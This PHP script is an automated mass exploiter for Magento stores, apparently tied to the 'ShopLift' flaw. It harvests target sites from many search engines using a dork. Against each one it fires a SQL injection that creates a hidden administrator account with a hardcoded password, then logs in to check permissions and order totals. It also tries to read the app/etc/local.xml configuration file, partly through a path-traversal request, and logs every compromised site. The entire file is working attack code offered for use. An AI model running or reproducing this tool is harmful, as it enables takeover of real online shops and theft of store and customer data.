<?php
/* ++++++++++++++++++++++++++++++++++ 
	ShopLift Exploiter Beta Version
		Author : VHiden133
	Use : php thisfile.php "Dork"
			No Name Crew
		Special Thanks to 
   +++++++++++++++++++++++++++++++++
*/
set_time_limit(0);
class ShopLiftFathurFreakz {
	private $dork = "";
	private $username = "VHiden133";
	private $password = "m4n1f3stL4";
	
	public function Dork($dork){
		$this->dork = $dork;
		return $this->dork;
	}
	
	private function CurlPost($url, $post = false){
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		if($post !== false){
			$isi = '';
			foreach($post as $key=>$value){
				$isi .= $key.'='.$value.'&';
			}
			rtrim($isi, '&');
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_POST, count($isi));
			curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
			curl_setopt($ch, CURLOPT_POSTFIELDS, $isi);
		}
		$data = curl_exec($ch);
		curl_close($ch);
		return $data;
	}
	
	private function GetStr($start,$end,$string){
		$a = explode($start,$string);
		$b = explode($end,$a[1]);
		return $b[0];
	}
	
	private function LoginDownloader($url){
		$link = parse_url($url);
		$data = $this->CurlPost(sprintf("%s://%s/downloader/",$link["scheme"],$link["host"]),
					array("username" => $this->username,
						  "password" => $this->password)
					);
		if(preg_match("/Log Out/i",$data) || (preg_match("/Return to Admin/i",$data))){
			$permission = (!preg_match("/Warning: Your Magento folder does not have sufficient write permissions./i",$data) ? "Writeable" : "Denied");
			return "Success\nPermission\t\t: ".$permission;
		} else {
			return "Failed";
		}
	}
		
	private function LoginAdmin($target){
		$link = parse_url($target);
		$get = $this->CurlPost(sprintf("%s://%s/admin/",$link["scheme"],$link["host"]));
		$key = $this->GetStr("<input name=\"form_key\" type=\"hidden\" value=\"","\" />",$get);
		$data = $this->CurlPost(sprintf("%s://%s/admin/",$link["scheme"],$link["host"]),
					array("login[username]" => $this->username,
						  "login[password]" => $this->password,
						  "form_key" => $key)
				);
		if($this->LocalFileDiscloure(sprintf("%s://%s",$link["scheme"],$link["host"]))){
			return "Success\nOrder Total\t\t: ".$this->GetStr("<span class=\"price\">","</span>",$data)."\nInstaled\t\t:".$this->LocalFileDiscloure(sprintf("%s://%s",$link["scheme"],$link["host"]));
		} else {
			return "Success\nOrder Total\t\t: ".$this->GetStr("<span class=\"price\">","</span>",$data);
		}
	}
	
	private function ShopLiftExploit($target){
		$email = substr(md5(time()),2,15);
		$link = parse_url($target);
		$data = $this->CurlPost(sprintf("%s://%s/admin/Cms_Wysiwyg/directive/index/",$link["scheme"],$link["host"]),
					array("filter" => base64_encode("popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);SET @SALT = 	'rp';SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{$this->password}') ), CONCAT(':', @SALT ));SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','{$email}@telekpitekwashere.cok','{$this->username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{$this->username}'),'Firstname');"),
					"___directive" 	=> base64_encode("{{block type=Adminhtml/report_search_grid output=getCsvFile}}"),
					"forwarded" 	=> "1")
				);    
		return (@imagecreatefromstring($data) !== false);
	}
	
	private function ExecuteExploit($victim){
		$file = fopen("ShopLift-".date("d-m-Y").".log","a");
		$url = parse_url($victim);
		$target = (!isset($url["scheme"]) ? "http://".$victim : $url["scheme"]."://".$url["host"]);
		if($this->ShopLiftExploit($target)){
			$downloader = $this->LoginDownloader($target);
			$admin = $this->LoginAdmin($target);
			$result = "\n============[ShopLift Result]============\nSite\t\t\t: {$target}\nLogin Admin\t\t: {$admin}\nLogin Downloader\t: {$downloader}\n===========================================\n";
			fwrite($file,$result);
			return $result;
		} else {
			return "[".date("H:i:s")."] ".$target." => Not vuln !\n";
		}
		fclose($file);
	}
	
	private function LocalFileDiscloure($target){
		$path = array(	"/app/etc/local.xml",
						"/magmi/web/download_file.php?file=../../app/etc/local.xml"
					);
		for($i=0;$i<=count($path);$i++){
			$test = $this->CurlPost($target.$path[$i]);
			if(isset($test) && preg_match('/install/i',$test) && preg_match('/date/i',$test)){
				return $this->GetStr("<date><![CDATA[","]]></date>",$test);
			} else {
				return false;
			}
		}
	}
	
	public function SearchEngine($engine){
		$list = array();
		$ccbing = array("ca","br","be","nl","uk","it","es","de","no","dk","se","ch","ru","jp","cn","kr","mx","ar","cl","au");
		$ccgoogle = array("ae","com.af","com.ag","off.ai","am","com.ar","as","at","com.au","az","ba","com.bd","be","bg","bi","com.bo","com.br","bs","co.bw","com.bz","ca","cd","cg","ch","ci","co.ck","cl","com.co","co.cr","com.cu","de","dj","dk","dm","com.do","com.ec","es","com.et","fi","com.fj","fm","fr","gg","com.gi","gl","gm","gr","com.gt","com.hk","hn","hr","co.hu","co.id","ie","co.il","co.im","co.in","is","it","co.je","com.jm","jo","co.jp","co.ke","kg","co.kr","kz","li","lk","co.ls","lt","lu","lv","com.ly","mn","ms","com.mt","mu","mw","com.mx","com.my","com.na","com.nf","com.ni","nl","no","com.np","nr","nu","co.nz","com.om","com.pa","com.pe","com.ph","com.pk","pl","pn","com.pr","pt","com.py","ro","ru","rw","com.sa","com.sb","sc","se","com.sg","sh","sk","sn","sm","com.sv","co.th","com.tj","tm","to","tp","com.tr","tt","com.tw","com.ua","co.ug","co.uk","com.uy","uz","com.vc","co.ve","vg","co.vi","com.vn","vu","ws","co.za","co.zm");
		$ccask = array("au","uk","ca","de","it","fr","es","ru","nl","pl","at","se","dk","no","br","mx","jp");
		$ccyahoo = array("au","ru","at","pl","il","tr","ua","gr","jp","cn","my","id","th","in","kr","tw","ro","za","pt","ca","uk","de","fr","es","it","hk","mx","br","ar","nl","dk","ph","cl","ru","co","fi","ve","nz","pe");
		switch($engine){
			case 1:
				for($i=0;$i<=1000;$i+=10){
					$search = $this->CurlPost("http://www.bing.com/search?q=".urlencode($this->dork)."&first=".$i);
					preg_match_all('/<a href=\"?http:\/\/([^\"]*)\"/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/live|msn|bing|microsoft/",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Bing (".count(array_unique($m[1])).")\n";
				}
				echo "[".date("H:i:s")."] Total Bing : ".count($list)."\n";
			break;
			case 2:
				for($x=0;$x<=count($ccbing)-1;$x++){
					for($i=0;$i<=1000;$i+=10){
						$search = $this->CurlPost("http://www.bing.com/search?q=".urlencode($this->dork)."&cc=".$ccbing[$x]."&rf=1&first=".$i."&FORM=PORE");
						preg_match_all('/<a href=\"?http:\/\/([^\"]*)\"/m', $search, $m);
						foreach($m[1] as $link){
							if(!preg_match("/live|msn|bing|microsoft/",$link)){
								if(!in_array($link,$list)){
									$list[] = $link;
								}
							}
						}
						echo "[".date("H:i:s")."] Catch Bing.".$ccbing[$x]." (".count(array_unique($m[1])).")\n";
					}
				}
				echo "[".date("H:i:s")."] Total Bing World : ".count($list)."\n";
			break;
			case 3:
				for($x=0;$x<=count($ccgoogle)-1;$x++){
					for($i=0;$i<=200;$i+=10){
						$search = $this->CurlPost("http://www.google.".$ccgoogle[$x]."/search?num=50&q=".urlencode($this->dork)."&start=".$i."&sa=N");
						preg_match_all('/<a href=\"?http:\/\/([^>\"]*)\//m', $search, $m);
						foreach($m[1] as $link){
							if(!preg_match("/google/",$link)){
								if(!in_array($link,$list)){
									$list[] = $link;
								}
							}
						}
						echo "[".date("H:i:s")."] Catch Google.".$ccgoogle[$x]." (".count(array_unique($m[1])).")\n";
					}
				}
				echo "[".date("H:i:s")."] Total Google World : ".count($list)."\n";
			break;
			case 4:
				for($x=0;$x<=count($ccask)-1;$x++){
					for($i=1;$i<=1000;$i+=100){
						$search = $this->CurlPost("http://".$ccask[$x].".ask.com/web?q=".urlencode($this->dork)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$i."&jss=");
						preg_match_all('/href=\"http:\/\/(.*?)\" onmousedown=/m', $search, $m);
						foreach($m[1] as $link){
							if(!preg_match("/ask\.com/",$link)){
								if(!in_array($link,$list)){
									$list[] = $link;
								}
							}
						}
						echo "[".date("H:i:s")."] Catch Ask.".$ccask[$x]."(".count(array_unique($m[1])).")\n";
					}
				}
				echo "[".date("H:i:s")."] Total Ask World : ".count($list)."\n";
			break;
			case 5:
				for($i=1;$i<=100;$i+=1){
					$search = $this->CurlPost("http://search.walla.co.il/?q=".urlencode($this->dork)."&type=text&page=".$i);
					preg_match_all('/<a href=\"http:\/\/(.+?)\" title=/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/walla\.co\.il/",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Walla (".count(array_unique($m[1])).")\n";
				}
				echo "[".date("H:i:s")."] Total Walla : ".count($list)."\n";
			break;
			case 6:
				for($i=1;$i<=400;$i+=10){
					$search = $this->CurlPost("http://szukaj.onet.pl/".$i.",query.html?qt=".urlencode($this->dork));
					preg_match_all('/<a href=\"http:\/\/(.*?)\">/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/onet|webcache|query/",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Onet (".count(array_unique($m[1])).")\n";
				}
				echo "[".date("H:i:s")."] Total Onet : ".count($list)."\n";
			break;
			case 7:
				for($i=1;$i<=50;$i+=1){
					$search = $this->CurlPost("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$i."&q=".urlencode($this->dork)."&st=local");
					preg_match_all('/<a href=\"http:\/\/(.*?)\"/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/\.sapo\.pt/",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Sapo (".count(array_unique($m[1])).")\n";
				}
				echo "[".date("H:i:s")."] Total Sapo : ".count($list)."\n";
			break;
			case 8:
				for($i=1;$i<=50;$i+=1){
					$search = $this->CurlPost("http://search.lycos.com/web?q=".urlencode($this->dork)."&pn=".$i);
					preg_match_all('/title=\"http:\/\/(.*?)\"/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/lycos/",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Lycos (".count(array_unique($m[1])).")\n";
				}
				echo "[".date("H:i:s")."] Total Lycos : ".count($list)."\n";
			break;
			case 9:
				for($i=1;$i<=1000;$i+=10){
					$search = $this->CurlPost("http://busca.uol.com.br/web/?ref=homeuol&q=".urlencode($this->dork)."&start=".$i);
					preg_match_all('/href=\"?http:\/\/([^\">]*)\"/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/uol\.com\.br|\/web/i",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Aol (".count(array_unique($m[1])).")\n";
				}
				echo "[".date("H:i:s")."] Total Uol : ".count($list)."\n";
			break;
			case 10:
				for($i=1;$i<=300;$i+=20){
					$search = $this->CurlPost("http://search.seznam.cz/?q=".urlencode($this->dork)."&count=20&from=".$i);
					preg_match_all('/href=\"?http:\/\/([^\">]*)\"/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/seznam\.cz|chytrevyhledavani\.cz|smobil\.cz|sklik\.cz/i",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Seznam (".count(array_unique($m[1])).")\n";
				}
				echo "[".date("H:i:s")."] Total Seznam : ".count($list)."\n";
			break;
			case 11:
				for($i=1;$i<=50;$i+=1){
					$search = $this->CurlPost("http://www.hotbot.com/search/web?pn=".$i."&q=".urlencode($this->dork));
					preg_match_all('/href=\"http:\/\/(.+?)\" title=/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/hotbot\.com/",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Hotbot (".count(array_unique($m[1])).")\n";
				}
				echo "[".date("H:i:s")."] Total Hotbot : ".count($list)."\n";
			break;
			case 12:
				for($i=1;$i<=300;$i+=10){
					$search = $this->CurlPost("http://search.aol.com/aol/search?q=".urlencode($this->dork)."&page=".$i);
					preg_match_all('/href=\"http:\/\/(.*?)\"/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/aol\.com/",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Aol (".count(array_unique($m[1])).")\n";
				}
				echo "[".date("H:i:s")."] Total Aol : ".count($list)."\n";
			break;
			case 13:
					for($i=1;$i<=1000;$i+=10){
					$search = $this->CurlPost("http://search.yahoo.com/search?p=".urlencode($this->dork)."&b=".$i);
					preg_match_all('/<a href=\"http:\/\/(.*?)\"/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/yahoo/",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Yahoo (".count(array_unique($m[1])).")\n";
				}
				echo "[".date("H:i:s")."] Total Yahoo : ".count($list)."\n";
			break;
			case 14:
				for($x=0;$x<=count($ccyahoo)-1;$x++){
					for($i=1;$i<=1000;$i+=100){
					$search = $this->CurlPost("http://".$ccyahoo[$x].".search.yahoo.com/search;_ylt=A0geu8nrPalPnkQAVmPrFAx.?p=".urlencode($this->dork)."&n=100&ei=UTF-8&va_vt=any&vo_vt=any&ve_vt=any&vp_vt=any&vst=0&vf=all&vc=hk&vm=p&fl=0&fr=yfp-t-501&fp_ip=11&xargs=0&pstart=1&b=".$i);
					preg_match_all('/<a href=\"http:\/\/(.*?)\"/m', $search, $m);
					foreach($m[1] as $link){
						if(!preg_match("/yahoo".$ccyahoo[$x]."/",$link)){
							if(!in_array($link,$list)){
								$list[] = $link;
							}
						}
					}
					echo "[".date("H:i:s")."] Catch Yahoo.".$ccyahoo[$x]." (".count(array_unique($m[1])).")\n";
					}
				}
				echo "[".date("H:i:s")."] Total Yahoo World : ".count($list)."\n";
			break;
		}
		if(count($list)>0){
			echo "Exploiting target ".count($list).". Please wait ... \n";
			foreach($list as $do){
				echo $this->ExecuteExploit($do);
			}
		}
	}
	
	public function ExploitLogo(){
		$logo = "==================================================\n";
		$logo .= "#\t Magento ShopLift Auto Exploiter \t #\n";
		$logo .= "#------------------------------------------------#\n";
		$logo .= "#\t Author \t: VHiden133 \t\t #\n";
		$logo .= "#\t Email \t\t: oppavikri@gmail.com #\n";
		$logo .= "#\t Thanks to \t: VHiden133 And indo Spammer Family \t #\n";
		$logo .= "#\t Usage \t\t: php ".basename($_SERVER["SCRIPT_FILENAME"], '.php').".php \"Dork\"\t #\n";
		$logo .= "#------------------------------------------------#\n";
		$logo .= "#\t (C) ".date("Y")." No Name Crew \t\t #\n";
		$logo .= "==================================================\n";
		echo $logo;
	}
}
$Exploiter = new ShopLiftFathurFreakz();
if(isset($argv[1]) && !empty($argv[1])){
	if($argv[1]=="-l" && !empty($argv[2])){
		$file = file_get_contents($argv[2]);
		$list = explode("\n",$file);
		if(isset($list)){
			echo "Starting engine ....\n";
			flush();
			sleep(2);
			echo "[".date("H:i:s")."] Scanning ".count($list)." dorks. Please wait ... \n";
			foreach($list as $dork){
				echo "[".date("H:i:s")."] Scanning target for dork : {$dork}\n";
				$Exploiter->Dork($dork);
				for($i=0;$i<15;$i++){
					$Exploiter->SearchEngine($i);
					flush();
					sleep(1);
				}
			}
		}
	} else {
		echo "Starting engine ....\n";
		flush();
		sleep(2);
		echo "[".date("H:i:s")."] Scanning target for dork : {$argv[1]}\n";
		$Exploiter->Dork($argv[1]);
		for($i=0;$i<15;$i++){
			$Exploiter->SearchEngine($i);
			flush();
			sleep(1);
		}
	}
	echo "Scan finished !!!\n";
	flush();
	sleep(1);
	echo "Shuting down engine !!!\n";
} else {
	$Exploiter->ExploitLogo();
}
